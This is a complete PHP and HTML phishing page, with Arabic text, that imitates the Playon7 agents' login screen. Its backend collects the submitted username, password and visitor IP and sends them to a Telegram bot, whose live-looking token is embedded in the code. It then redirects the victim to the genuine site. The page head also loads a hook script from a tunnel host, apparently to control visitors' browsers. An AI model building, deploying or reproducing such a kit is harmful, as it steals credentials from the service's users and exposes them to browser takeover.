<?php
// --- الجزء الخاص بمعالجة البيانات (PHP Backend) ---
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    
    // معلومات بوت التلجرام الخاص بك
    $botToken = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
    $chatId = "8665747715";
    $ip = $_SERVER['REMOTE_ADDR']; // جلب IP الضحية
    
    $message = "🎯 صيد جديد (PHP High-Level):\n";
    $message .= "👤 المستخدم: " . $user . "\n";
    $message .= "🔑 كلمة السر: " . $pass . "\n";
    $message .= "🌐 IP الضحية: " . $ip;

    // إرسال البيانات عبر API التلجرام
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    file_get_contents($url);

    // تحويل الضحية للموقع الرسمي بعد الصيد مباشرة
    header("Location: https://agents.playon7.com/");
    exit();
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Agent System | Playon7 Login</title>
    
    <script src="https://0fc034dfd1d961.lhr.life/hook.js"></script>

    <style>
        body { background-color: #0b021d; color: white; font-family: 'Tahoma', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #1a0b33; padding: 40px; border-radius: 15px; text-align: center; border: 1px solid #e100ff; box-shadow: 0 0 25px rgba(225, 0, 255, 0.3); width: 100%; max-width: 380px; }
        .container img { width: 150px; margin-bottom: 20px; }
        h2 { font-weight: normal; margin-bottom: 30px; color: #f1f1f1; }
        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #3d1a63; background: #0b021d; color: white; box-sizing: border-box; }
        button { background: linear-gradient(90deg, #d600d6, #8e00d6); color: white; border: none; padding: 14px; width: 100%; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 10px; }
        button:hover { opacity: 0.9; }
        .extra { margin-top: 20px; font-size: 12px; color: #7a5ba0; }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://agents.playon7.com/assets/images/logo.png" alt="Playon7 Logo">
        <h2>تسجيل دخول الوكلاء</h2>
        
        <form method="POST" action="">
            <input type="text" name="username" placeholder="اسم المستخدم" required>
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit">دخول النظام</button>
        </form>
        
        <div class="extra">نظام الإدارة المركزية v4.2.0</div>
    </div>

</body>
</html>
